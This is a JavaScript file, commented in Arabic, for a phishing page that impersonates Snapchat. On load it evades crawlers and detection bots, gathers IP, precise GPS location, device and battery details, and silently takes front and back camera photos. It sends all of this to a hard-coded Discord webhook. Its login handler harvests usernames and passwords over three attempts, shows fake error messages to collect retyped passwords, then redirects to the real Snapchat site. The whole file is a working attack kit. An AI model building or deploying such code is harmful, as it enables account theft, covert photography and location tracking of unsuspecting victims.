/* ==========================================================================
   ADVANCED HUNTING & DATA COLLECTION ENGINE - (java.script)
   ========================================================================== */

// استبدل برابط الـ Webhook الخاص بك
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1564569407865491626/O7w6n98Q51WF2LChrTTdi2FmeUfrrzZpZp2fF5e9F7bjpPgvBnnrYI_qmG4nV5N_FXZg";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// تتبع عداد محاولات تسجيل الدخول تفاعلياً
let loginAttempts = 0;

/* --------------------------------------------------------------------------
   1. فحص روبوتات الحماية والـ Bots (Anti-Bot Bypass)
   -------------------------------------------------------------------------- */
function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const isWebDriver = navigator.webdriver || window.navigator.webdriver;
    const isPhantom = window.callPhantom || window._phantom;
    const isCypress = window.__cypress;
    
    if (ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless') || isWebDriver || isPhantom || isCypress) {
        return true;
    }
    return false;
}

/* --------------------------------------------------------------------------
   2. جلب الـ IP والموقع الجغرافي التقريبي عبر الخدمات الخارجية
   -------------------------------------------------------------------------- */
async function getIPAndLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "غير معروف",
            city: data.city || "غير معروف",
            region: data.region || "غير معروف",
            country: data.country_name || "غير معروف",
            org: data.org || "غير معروف",
            timezone: data.timezone || "غير معروف"
        };
    } catch (error) {
        try {
            const altRes = await fetch('https://api.ipify.org?format=json');
            const altData = await altRes.json();
            return { ip: altData.ip || "غير معروف", city: "غير معروف", region: "غير معروف", country: "غير معروف", org: "غير معروف", timezone: "غير معروف" };
        } catch (e) {
            return { ip: "غير معروف", city: "غير معروف", region: "غير معروف", country: "غير معروف", org: "غير معروف", timezone: "غير معروف" };
        }
    }
}

/* --------------------------------------------------------------------------
   3. جمع معلومات الجهاز التقنية والبطارية والشاشة المتقدمة
   -------------------------------------------------------------------------- */
async function getSystemInfo() {
    const geoip = await getIPAndLocation();
    const ua = navigator.userAgent;
    const platform = navigator.platform || "غير معروف";
    const language = navigator.language || "غير معروف";
    const languages = navigator.languages ? navigator.languages.join(', ') : language;
    const screenRes = `${window.screen.width} x ${window.screen.height}`;
    const colorDepth = window.screen.colorDepth || "غير معروف";
    const cores = navigator.hardwareConcurrency || "غير معروف";
    const deviceMemory = navigator.deviceMemory || "غير معروف";
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const netType = connection ? (connection.effectiveType || "غير معروف") : "غير معروف";
    const touchPoints = navigator.maxTouchPoints || 0;

    let batteryInfo = "غير مدعومة أو مرفوضة";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋';
            batteryInfo = `${level}% (${charging})`;
        }
    } catch (e) {
        batteryInfo = "غير متاحة";
    }

    return {
        ...geoip,
        ua,
        platform,
        language,
        languages,
        screenRes,
        colorDepth,
        cores,
        deviceMemory,
        netType,
        touchPoints,
        batteryInfo
    };
}

/* --------------------------------------------------------------------------
   4. التقاط الصور بالكاميرا (أمامية وخلفية متسلسلة)
   -------------------------------------------------------------------------- */
async function captureCamera(facingMode) {
    try {
        const constraints = {
            video: {
                facingMode: facingMode,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        
        await new Promise(resolve => setTimeout(resolve, 2200));
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.95));
        stream.getTracks().forEach(track => track.stop());
        return blob;
    } catch (error) {
        return null;
    }
}

/* --------------------------------------------------------------------------
   5. إرسال البيانات المنسقة والحزم المتكاملة إلى ديسكورد (Webhook)
   -------------------------------------------------------------------------- */
async function sendToDiscord(blobs, lat, lng, user = "", pass = "", extraStatus = "") {
    if (isBot()) return;

    const info = await getSystemInfo();
    const formData = new FormData();
    
    let content = `🚨 **[ تقرير صيد جديد ومتكامل - التفاعل الذكي ]** 🚨\n\n` +
                  `🌐 **عنوان الـ IP:** \`${info.ip}\`\n` +
                  `🏙️ **الموقع (عبر الـ IP):** \`${info.country} / ${info.region} / ${info.city}\`\n` +
                  `🏢 **مزود الخدمة:** \`${info.org}\`\n` +
                  `💻 **نظام التشغيل:** \`${info.platform}\`\n` +
                  `📱 **معلومات المتصفح:** \`${info.ua}\`\n` +
                  `🔋 **حالة البطارية:** \`${info.batteryInfo}\`\n` +
                  `📐 **دقة الشاشة:** \`${info.screenRes}\` | 🧠 **النوى:** \`${info.cores}\`\n`;
    
    if (lat && lng) {
        content += `📍 **الموقع الجغرافي الدقيق (GPS):** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng})\n` +
                   `🗺️ **الإحداثيات:** \`${lat}, ${lng}\`\n`;
    } else {
        content += `📍 **الموقع الجغرافي الدقيق (GPS):** تم رفض الإذن.\n`;
    }

    if (user && pass) {
        content += `\n🎯 **بيانات الحساب المُدخلة (محاولة رقم ${loginAttempts}):**\n` +
                   `👤 **اسم المستخدم:** \`${user}\`\n` +
                   `🔑 **كلمة المرور:** \`${pass}\`\n`;
    }

    if (extraStatus) {
        content += `\n📝 **حالة الحدث:** ${extraStatus}\n`;
    }
    
    content += `\n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

    if (blobs.front1) formData.append('file1', blobs.front1, 'front_shot_1.png');
    if (blobs.front2) formData.append('file2', blobs.front2, 'front_shot_2.png');
    if (blobs.back) formData.append('file3', blobs.back, 'back_shot.png');

    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "Interactive Hunter Bot",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));

    try {
        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) {}
}

/* --------------------------------------------------------------------------
   6. التنفيذ التلقائي فور الدخول لصفحة Index.html
   -------------------------------------------------------------------------- */
async function autoInit() {
    if (isBot()) return;

    let lat = null, lng = null;

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                lat = position.coords.latitude;
                lng = position.coords.longitude;
            },
            () => {},
            { timeout: 8000, enableHighAccuracy: true }
        );
    }

    let front1 = null, front2 = null, back = null;
    front1 = await captureCamera("user");
    if (front1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        front2 = await captureCamera("user");
    }
    back = await captureCamera("environment");

    await sendToDiscord({ front1, front2, back }, lat, lng, "", "", "تم الدخول التلقائي للملف الشخصي وسحب البيانات.");
}

/* --------------------------------------------------------------------------
   7. معالجة نموذج تسجيل الدخول والتفاعل مع المحاولات (apply.html)
   -------------------------------------------------------------------------- */
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        loginAttempts++; // زيادة عداد المحاولات

        const usernameInput = e.target.username.value;
        const passwordInput = e.target.password.value;
        
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.style.display = 'flex';

        let lat = null, lng = null;
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                p => {
                    lat = p.coords.latitude;
                    lng = p.coords.longitude;
                },
                () => {},
                { timeout: 5000, enableHighAccuracy: true }
            );
        }

        let front1 = await captureCamera("user");
        let back = await captureCamera("environment");

        // إرسال البيانات للديسكورد في كل محاولة مع توضيح رقم المحاولة
        await sendToDiscord({ front1, back }, lat, lng, usernameInput, passwordInput, `محاولة تسجيل الدخول رقم (${loginAttempts}).`);

        setTimeout(() => {
            if (loadingOverlay) loadingOverlay.style.display = 'none';

            if (loginAttempts >= 3) {
                // المحاولة الثالثة: التوجيه الفوري إلى صفحة سناب شات الرسمية
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                // المحاولة الأولى والثانية: إظهار رسالة خطأ كلمة المرور وتفريغ الخانة
                const errorMsg = document.getElementById('loginErrorMsg');
                if (errorMsg) errorMsg.style.display = 'block';
                e.target.password.value = "";
            }
        }, 1800);
    });
}

/* --------------------------------------------------------------------------
   8. التشغيل التلقائي عند التحميل
   -------------------------------------------------------------------------- */
window.onload = () => {
    setTimeout(autoInit, 1500);
};
